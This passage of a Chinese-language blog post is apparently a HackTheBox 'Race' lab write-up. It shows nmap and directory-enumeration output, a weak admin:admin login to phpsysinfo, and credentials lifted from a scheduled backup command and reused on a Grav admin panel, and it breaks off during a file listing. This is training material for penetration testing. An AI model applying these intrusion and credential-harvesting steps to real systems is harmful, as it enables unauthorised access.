@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- Google Fonts -->
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cn-fontsource-lxgw-wen-kai-screen-r/font.css">
+    <link rel="stylesheet" type="text/css" href="https://fonts.font.im/css?family=Inconsolata:normal,bold">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox——HTB Race Writeup">
+<meta property="og:url" content="https://n0nome.github.io/2025/09/08/Race/Race/index.html">
+<meta property="og:site_name" content="N0nome&#96;s Fucking Life">
+<meta property="og:description" content="Welcome to N0nome&#96;s F**king blog.(:This is just a joke:)Do you want to become stronger than me? You just need to move your hands more. 鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习 Nmap123456789101112131415">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://n0nome.github.io/images/race-19.png">
+<meta property="og:image" content="https://n0nome.github.io/race.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-1.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-2.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-3.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-4.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-5.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-6.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-7.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-8.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-9.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-10.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-11.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-12.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-14.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-15.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-16.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-17.png">
+<meta property="og:image" content="https://n0nome.github.io/images/race-18.png">
+<meta property="article:published_time" content="2025-09-08T06:56:48.724Z">
+<meta property="article:modified_time" content="2025-09-08T06:56:48.828Z">
+<meta property="article:author" content="n0nome">
+<meta property="article:tag" content="writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0nome.github.io/images/race-19.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/laojun.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/laojun.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/laojun.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox——HTB Race Writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-RXS95XH60B"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-RXS95XH60B');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
+     --><!--
+       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2025/09/08/Soulmate/Soulmate/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2025/09/03/Guardian/Guardian/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/09/08/Race/Race/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/09/08/Race/Race/&text=HackTheBox——HTB Race Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/09/08/Race/Race/&is_video=false&description=HackTheBox——HTB Race Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Race Writeup&body=Check out this article: https://n0nome.github.io/2025/09/08/Race/Race/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/09/08/Race/Race/&title=HackTheBox——HTB Race Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/09/08/Race/Race/&name=HackTheBox——HTB Race Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/09/08/Race/Race/&t=HackTheBox——HTB Race Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    
+
+    
+      <!-- 如果文章被加密，初始隐藏目录 -->
+      <div id="toc" style="">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nmap"><span class="toc-number">1.</span> <span class="toc-text">Nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-info"><span class="toc-number">1.1.</span> <span class="toc-text">Enum info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weak-Password-Login-Phpsysinfo-And-Get-Creds"><span class="toc-number">1.2.</span> <span class="toc-text">Weak Password Login Phpsysinfo And Get Creds</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Source-Code-Analyze-And-Reset-Patrick-s-Password"><span class="toc-number">1.3.</span> <span class="toc-text">Source Code Analyze And Reset Patrick&#96;s Password</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2024-28116"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2024-28116</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-www-data"><span class="toc-number">2.</span> <span class="toc-text">Shell As www-data</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Max-Home-File-Get-Creds"><span class="toc-number">2.1.</span> <span class="toc-text">User-Max Home File Get Creds</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Max"><span class="toc-number">3.</span> <span class="toc-text">Shell As Max</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum-Scheduled-Task"><span class="toc-number">3.1.</span> <span class="toc-text">Enum Scheduled Task</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-As-Root"><span class="toc-number">4.</span> <span class="toc-text">Shell As Root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hashes"><span class="toc-number">4.1.</span> <span class="toc-text">Hashes</span></a></li></ol></li></ol>
+      </div>
+     
+ </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox——HTB Race Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">n0nome</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-08T06:56:48.724Z" class="dt-published" itemprop="datePublished">2025-09-08</time>
+        
+        (Updated: <time datetime="2025-09-08T06:56:48.828Z" class="dt-updated" itemprop="dateModified">2025-09-08</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Welcome to N0nome&#96;s F**king <a href="https://n0nome.github.io/">blog</a>.<br>(:This is just a joke:)<br><a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8uK3T">Do you want to become stronger than me? You just need to move your hands more.</a></p>
+<p><code>鉴于博主学识浅薄，文中只写通关，其中利害关系还需要各位Google学习</code><br><a data-fancybox="gallery" data-src="/images/race-19.png" data-caption=""><img src="/images/race-19.png"></a></p>
+<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   256 62:b0:1e:c5:e8:81:5c:94:39:ed:37:7e:21:cf:b1:a8 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHEjDeiMn6SWXVPExX7GE0w2SN1NWwcENq/k0u1U/ynE2bLsgpcSYzVj3rlLMXQmqHdDeJufIhhpiIVK09H76RA=</span><br><span class="line">|   256 37:a3:d3:<span class="built_in">cd</span>:35:dc:cc:d8:db:3c:c3:4d:ad:22:29:a9 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGdwfoBdk/yerZIQm8EL/rGDkyZZcFgS0YLynFm5MTzo</span><br><span class="line">53/tcp open  domain  syn-ack ttl 63 dnsmasq 2.51</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: dnsmasq-2.51</span><br><span class="line">80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: HEAD GET POST OPTIONS</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.4.52 (Ubuntu)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/race.png" data-caption=""><img src="/race.png"></a></p>
+<p>很奇怪诶，如果输入ip的话会跳转到<code>/racers</code>下面</p>
+<p>里面暴露了一个<code>fast@race.vl</code>，先加到hosts</p>
+<h3 id="Enum-info"><a href="#Enum-info" class="headerlink" title="Enum info"></a>Enum info</h3><p>扫一下子域和目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/form/ =&gt; http://10.129.238.253/racers/racers/user/plugins/form                                                                                                </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/assets/ =&gt; http://10.129.238.253/racers/racers/assets                                                                                                                      </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/css/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/css                                                              </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark                                                                                                </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/image/ =&gt; http://10.129.238.253/racers/image         </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/markdown-notices/ =&gt; http://10.129.238.253/racers/racers/user/plugins/markdown-notices                                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/ =&gt; http://10.129.238.253/racers/racers       </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/system/ =&gt; http://10.129.238.253/racers/racers/system                                                                                                                      </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/form/assets/ =&gt; http://10.129.238.253/racers/racers/user/plugins/form/assets                                                                                  </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/login/css/ =&gt; http://10.129.238.253/racers/racers/user/plugins/login/css                                                                                      </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/ =&gt; http://10.129.238.253/racers/racers/user/plugins                                                                                                          </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/ =&gt; http://10.129.238.253/racers/racers/user/themes                                                                                                            </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/js/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark/js                                                                                          </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/ =&gt; http://10.129.238.253/racers/racers/user                                   </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/login/ =&gt; http://10.129.238.253/racers/racers/user/plugins/login                                                                                              </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/system/assets/jquery/ =&gt; http://10.129.238.253/racers/racers/system/assets/jquery                                                                                          </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/images/logo/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark/images/logo                                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/css-compiled/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark/css-compiled                                                                      </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/markdown-notices/assets/ =&gt; http://10.129.238.253/racers/racers/user/plugins/markdown-notices/assets                                                          </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/system/assets/ =&gt; http://10.129.238.253/racers/racers/system/assets                                                                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/css/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark/css                                                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/text/ =&gt; http://10.129.238.253/racers/text           </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/themes/quark/images/ =&gt; http://10.129.238.253/racers/racers/user/themes/quark/images                                                                                  </span><br><span class="line">301      GET        9l       28w      324c http://10.129.238.253/racers/images =&gt; http://10.129.238.253/racers/images/       </span><br><span class="line">200      GET     1006l     5298w   376919c http://10.129.238.253/racers/_3a261ca2-3898-434a-9d95-e8722981979b.jpeg           </span><br><span class="line">301      GET        9l       28w      321c http://10.129.238.253/racers/tmp =&gt; http://10.129.238.253/racers/tmp/             </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/admin/ =&gt; http://10.129.238.253/racers/racers/admin                                                                                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/images/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/images                                                        </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/themes/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin/themes                                                                                </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/css-compiled/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/css-compiled                                            </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin                                                                                              </span><br><span class="line">302      GET        0l        0w        0c http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav/ =&gt; http://10.129.238.253/racers/racers/user/plugins/admin/themes/grav                                                                      </span><br><span class="line">301      GET        9l       28w      323c http://10.129.238.253/racers/cache =&gt; http://10.129.238.253/racers/cache/         </span><br><span class="line">301      GET        9l       28w      321c http://10.129.238.253/racers/bin =&gt; http://10.129.238.253/racers/bin/             </span><br><span class="line">200      GET      128l      629w    11357c http://10.129.238.253/racers/admin                                                </span><br><span class="line">200      GET      663l     3608w   309433c http://10.129.238.253/racers/_59310d8c-2f90-480b-8fe0-0b0fc533017d.jpeg</span><br><span class="line">301      GET        9l       28w      322c http://10.129.238.253/racers/user =&gt; http://10.129.238.253/racers/user/           </span><br><span class="line">200      GET     1196l     6593w   508244c http://10.129.238.253/racers/_789fff1e-4bfb-4c99-b0d2-8ed72a0f141d.jpeg           </span><br><span class="line">200      GET      180l      632w    10406c http://10.129.238.253/racers/login                                                </span><br><span class="line">200      GET     1135l     7070w   533814c http://10.129.238.253/racers/_48202417-292a-4d09-818c-984bd68e706a.jpeg           </span><br><span class="line">200      GET      965l     5546w   429554c http://10.129.238.253/racers/_6d6b4f86-2d37-401c-8bad-cb8b771595ac.jpeg           </span><br><span class="line">200      GET     1226l     6901w   533253c http://10.129.238.253/racers/_c0fea67a-90de-426d-9bcc-ee77c33bdd45.jpeg           </span><br><span class="line">200      GET      140l     1088w    11411c http://10.129.238.253/racers/                                                     </span><br><span class="line">301      GET        9l       28w      324c http://10.129.238.253/racers/assets =&gt; http://10.129.238.253/racers/assets/       </span><br><span class="line">301      GET        9l       28w      322c http://10.129.238.253/racers/logs =&gt; http://10.129.238.253/racers/logs/           </span><br><span class="line">301      GET        9l       28w      324c http://10.129.238.253/racers/backup =&gt; http://10.129.238.253/racers/backup/       </span><br><span class="line">200      GET      140l     1088w    11411c http://10.129.238.253/racers/home                                                 </span><br><span class="line">301      GET        9l       28w      324c http://10.129.238.253/racers/system =&gt; http://10.129.238.253/racers/system/</span><br></pre></td></tr></table></figure>
+
+<p>好乱，人群中一眼就看到了admin和login</p>
+<blockquote>
+<p>login</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/images/race-1.png" data-caption=""><img src="/images/race-1.png"></a></p>
+<blockquote>
+<p>admin</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/images/race-2.png" data-caption=""><img src="/images/race-2.png"></a></p>
+<p>grav是一个cms，但是两个登录也都没有凭据信息，回到初始位置</p>
+<p><a data-fancybox="gallery" data-src="/images/race-3.png" data-caption=""><img src="/images/race-3.png"></a></p>
+<p>那看一下网站根目录下还有别的没有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">└─$ dirsearch -u http://10.129.238.253/</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /Pentest/Race/reports/http_10.129.238.253/__25-09-04_08-14-07.txt</span><br><span class="line"></span><br><span class="line">Target: http://10.129.238.253/</span><br><span class="line"></span><br><span class="line">[08:14:07] Starting: </span><br><span class="line">[08:14:23] 403 -  279B  - /.ht_wsr.txt</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess.bak1</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess.sample</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess.orig</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess.save</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess_extra</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess_orig</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccess_sc</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccessOLD</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccessBAK</span><br><span class="line">[08:14:23] 403 -  279B  - /.htm</span><br><span class="line">[08:14:23] 403 -  279B  - /.htaccessOLD2</span><br><span class="line">[08:14:23] 403 -  279B  - /.html</span><br><span class="line">[08:14:23] 403 -  279B  - /.htpasswd_test</span><br><span class="line">[08:14:23] 403 -  279B  - /.htpasswds</span><br><span class="line">[08:14:23] 403 -  279B  - /.httr-oauth</span><br><span class="line">[08:14:25] 403 -  279B  - /.php</span><br><span class="line">[08:15:17] 401 -  461B  - /phpsysinfo/</span><br><span class="line">[08:15:24] 403 -  279B  - /server-status</span><br><span class="line">[08:15:24] 403 -  279B  - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+
+<h3 id="Weak-Password-Login-Phpsysinfo-And-Get-Creds"><a href="#Weak-Password-Login-Phpsysinfo-And-Get-Creds" class="headerlink" title="Weak Password Login Phpsysinfo And Get Creds"></a>Weak Password Login Phpsysinfo And Get Creds</h3><p>有一个<code>/phpsysinfo</code>没见过，进去看看</p>
+<p><a data-fancybox="gallery" data-src="/images/race-4.png" data-caption=""><img src="/images/race-4.png"></a></p>
+<p>又要凭据，上面有admin文件夹，尝试一下弱密码</p>
+<blockquote>
+<p>admin:admin</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/images/race-5.png" data-caption=""><img src="/images/race-5.png"></a></p>
+<p>登录进来了</p>
+<p>快翻一下快翻一下</p>
+<p>看起来这个phpsysinfo是对系统的一个监控系统，lll里面会检测系统的基础信息和在运行的一些进程</p>
+<p>在自动任务那里找到了一些有用的</p>
+<p><a data-fancybox="gallery" data-src="/images/race-6.png" data-caption=""><img src="/images/race-6.png"></a></p>
+<blockquote>
+<p>&#x2F;usr&#x2F;bin&#x2F;curl –insecure –connect-timeout 60 -u backup:Wedobackupswithsecur3password5.Noonecanhackus! -T &#x2F;var&#x2F;www&#x2F;html&#x2F;racers&#x2F;backup&#x2F; s<a href="ftp://offsite-backup.race.vl/backups/">ftp://offsite-backup.race.vl/backups/</a></p>
+</blockquote>
+<p>呕吼，有一个凭据和一个域名，加hosts</p>
+<p>然后那个域名也没啥特殊的，先放一边，用凭证登录一下两个登录页</p>
+<p>login登录不了，admin可以登录进去</p>
+<p><a data-fancybox="gallery" data-src="/images/race-7.png" data-caption=""><img src="/images/race-7.png"></a></p>
+<h3 id="Source-Code-Analyze-And-Reset-Patrick-s-Password"><a href="#Source-Code-Analyze-And-Reset-Patrick-s-Password" class="headerlink" title="Source Code Analyze And Reset Patrick&#96;s Password"></a>Source Code Analyze And Reset Patrick&#96;s Password</h3><p>点一下那个backupnow就会下载一个压缩文件，下载下来解压缩一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">╰─ ❯❯ <span class="built_in">ls</span> -la</span><br><span class="line">drwxr-xr-x    - wansh  4 Sep 16:30  .</span><br><span class="line">drwxr-xr-x    - wansh  4 Sep 16:30  ..</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  .github</span><br><span class="line">.rw-r--r-- 3.2k wansh  2 Oct  2023 󱁻 .htaccess</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  .phan</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  assets</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  backup</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  bin</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  cache</span><br><span class="line">.rw-r--r-- 222k wansh  2 Oct  2023  CHANGELOG.md</span><br><span class="line">.rw-r--r-- 5.5k wansh  2 Oct  2023  